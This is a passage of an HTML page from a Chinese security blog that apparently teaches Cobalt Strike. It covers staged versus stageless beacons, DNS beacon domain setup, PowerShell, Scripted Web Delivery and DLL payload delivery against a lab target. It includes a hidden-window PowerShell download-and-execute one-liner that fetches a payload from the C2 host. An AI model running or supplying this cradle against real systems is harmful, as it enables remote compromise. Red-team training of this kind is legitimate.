+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918854.png" data-fancybox="true"/></div></div>
+
+<p>有的在线免杀的网站让提供的第二阶段地址就是此地址</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918325.png" data-fancybox="true"/></div></div>
+
+<h3 id="exe上线-无阶段"><a href="#exe上线-无阶段" class="headerlink" title="exe上线(无阶段)"></a>exe上线(无阶段)</h3><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918110.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918485.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918148.png" data-fancybox="true"/></div></div>
+
+<p>可以看到无阶段的文件大小要比有阶段的大.这是因为无阶段的将shellcode内置到了木马中.而有阶段需要去下载.更像是小马拉大马</p>
+<h3 id="Staged和Stageless的区别"><a href="#Staged和Stageless的区别" class="headerlink" title="Staged和Stageless的区别"></a>Staged和Stageless的区别</h3><h4 id="生成的exe体积不同"><a href="#生成的exe体积不同" class="headerlink" title="生成的exe体积不同"></a>生成的exe体积不同</h4><h4 id="上线经过的流程不同"><a href="#上线经过的流程不同" class="headerlink" title="上线经过的流程不同"></a>上线经过的流程不同</h4><ol>
+<li>Staged(有阶段): 在有阶段的执行方式中，Cobalt Strike Payload 分为两个主要阶段，即<strong>Stager</strong> 和 <strong>Stage</strong><ol>
+<li>Stager(初始执行载荷):下载器<ol>
+<li><strong>定义:</strong> Stager是Stage 1，是一个较小的、轻量级的初始执行载荷。 </li>
+<li><strong>作用:</strong> 主要任务是与Cobalt Strike团队服务器建立初始连接，并从服务器下载更大的Payload，也就是Stage 2</li>
+</ol>
+</li>
+<li>Stage (完整的执行载荷):<ol>
+<li><strong>定义:</strong> Stage是Stage 2，是一个更大、更完整的执行载荷。 </li>
+<li><strong>作用:</strong> 一旦Stager与Cobalt Strike团队服务器建立连接，Stager会请求下载Stage。Stage是整个Payload的主体，包含了更多的功能和模块。一旦下载，Stage在目标系统上执行，并与Cobalt Strike服务器保持连接，执行渗透测试人员指定的各种命令和操作。</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>Stageless(无阶段):<ol>
+<li><strong>定义:</strong> 在无阶段的执行方式中，整个 Payload 在一次性的过程中直接执行，而不需要分为两个阶段。 </li>
+<li><strong>特点:</strong> 由于无阶段的执行方式减少了与团队服务器的交互，因此可能更难被检测。然而，这也限制了 Payload 的大小，因为整个 Payload 需要在一次连接中传输</li>
+</ol>
+</li>
+</ol>
+<h3 id="Beacon-DNS上线"><a href="#Beacon-DNS上线" class="headerlink" title="Beacon DNS上线"></a>Beacon DNS上线</h3><h4 id="域名的配置"><a href="#域名的配置" class="headerlink" title="域名的配置"></a>域名的配置</h4><p>域名设置如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一条A记录指向CS的IP地址  </span><br><span class="line">vpn.lavaicer.club =&gt; CS的IP地址  </span><br><span class="line">几条NS记录指向刚刚A记录对应的域名(也可以只写一条)  </span><br><span class="line">ns1.lavaicer.club =&gt; vpn.lavaicer.club  </span><br><span class="line">ns2.lavaicer.club =&gt; vpn.lavaicer.club  </span><br><span class="line">ns3.lavaicer.club =&gt; vpn.lavaicer.club</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920986.png" data-fancybox="true"/></div></div>
+
+<h4 id="创建监听器-1"><a href="#创建监听器-1" class="headerlink" title="创建监听器"></a>创建监听器</h4><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920952.png" data-fancybox="true"/></div></div>
+
+<h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920371.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以切换为txt</span></span><br><span class="line">beacon&gt; mode dns-txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="powershell-command上线"><a href="#powershell-command上线" class="headerlink" title="powershell command上线"></a>powershell command上线</h3><p><code>attacks</code>—&gt;<code>Packages</code>—&gt;<code>Payload生成器</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920132.png" data-fancybox="true"/></div></div>
+
+<p>选择<code>powershell command</code>命令</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920611.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920423.png" data-fancybox="true"/></div></div>
+
+<h3 id="Scripted-Web-Delivery-S-上线"><a href="#Scripted-Web-Delivery-S-上线" class="headerlink" title="Scripted Web Delivery(S)上线"></a>Scripted Web Delivery(S)上线</h3><p><code>Attacks</code>—&gt;<code>Web Drive-by</code>—&gt;<code>Scripted Web Delivery(S)</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920168.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921645.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921896.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.74.131:80/a&#x27;))&quot;</span></span><br><span class="line">本质上也是通过powershell远程加载上线,但是稍微有点不同,</span><br><span class="line">这中攻击方式是攻击者在cs服务器上开启一个web站点</span><br><span class="line">然后靶机中运行powershell命令--&gt;向VPS发起请求--&gt;响应payload作为powershell要执行的命令</span><br><span class="line">属于payload远程加载执行的一种方式</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921865.png" data-fancybox="true"/></div></div>
+
+<h3 id="DLL文件上线"><a href="#DLL文件上线" class="headerlink" title="DLL文件上线"></a>DLL文件上线</h3><p><code>Attacks</code>—&gt;<code>Packages</code>—&gt;<code>Windows可执行程序</code>—&gt;<code>Windwos DLL</code> </p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241922000.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241922338.png" data-fancybox="true"/></div></div>
+
+<p>将生成的dll文件上传到靶机 ， 然后在靶机注册dll文件上线</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241923597.png" data-fancybox="true"/></div></div>
+
+<p><strong>在windows中可执行文件 , 不是只有.exe文件 , .dll文件和.com文件也都是可执行文件</strong></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/09/24/3c3f9499/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/09/24/3c3f9499/&title=CS-Cobalt Strike必备知识 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241943319.png&summary=
+    总字符数: 15.71K 
+    
+    
+    代码: 8.69K, 文本: 2.47K
+    
+    
+    预计阅读时间: 49 分钟
+    
+    
+
+CS简介什么是CS
+Cobalt Strike是..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=CS-Cobalt Strike必备知识 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/09/24/3c3f9499/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/09/24/3c3f9499/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/09/25/3c3f9499/">CS-Cobalt Strike修改特征</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/28/ecc74cbe/">后渗透-Restricted Shell Bypass</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2024\10\27\77c80f0f\" title="CS-C语言总结"><span class="title">CS-C语言总结</span></a><a class="item" href="\2024\09\26\da146604\" title="CS-云函数隐匿C2"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="\2024\10\28\ce454855\" title="CS-开发环境配置及exe处理"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item" href="\2024\09\25\3c3f9499\" title="CS-Cobalt Strike修改特征"><span class="title">CS-Cobalt Strike修改特征</span></a><a class="item" href="\2021\09\26\1b012da8\" title="CorePress主题优化"><span class="title">CorePress主题优化</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E7%AE%80%E4%BB%8B"><span class="toc-text">CS简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCS"><span class="toc-text">什么是CS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-text">目录结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C"><span class="toc-text">安装和运行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%AF%A6%E6%83%85"><span class="toc-text">菜单栏详情</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cobalt-Strike"><span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#View"><span class="toc-text">View</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attacks"><span class="toc-text">Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Packages-%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8"><span class="toc-text">Packages(生成后门)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-Drive-by-%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="toc-text">Web Drive-by(钓鱼攻击)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6-%E5%BC%83%E7%94%A8"><span class="toc-text">钓鱼邮件(弃用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reporting-%E6%8A%A5%E5%91%8A"><span class="toc-text">Reporting(报告)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Help"><span class="toc-text">Help</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%A0%8F"><span class="toc-text">工具栏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-text">基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">创建监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%9C%A8%E9%A9%AC"><span class="toc-text">运行木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Beacon%E4%BB%8B%E7%BB%8D"><span class="toc-text">Beacon介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">Beacon是什么?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Beacon%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">Beacon的类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E4%B8%8A%E7%BA%BF%E7%B1%BB%E5%9E%8B"><span class="toc-text">CS上线类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exe%E4%B8%8A%E7%BA%BF-%E6%9C%89%E9%98%B6%E6%AE%B5"><span class="toc-text">exe上线(有阶段)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe%E4%B8%8A%E7%BA%BF-%E6%97%A0%E9%98%B6%E6%AE%B5"><span class="toc-text">exe上线(无阶段)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Staged%E5%92%8CStageless%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">Staged和Stageless的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E7%9A%84exe%E4%BD%93%E7%A7%AF%E4%B8%8D%E5%90%8C"><span class="toc-text">生成的exe体积不同</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 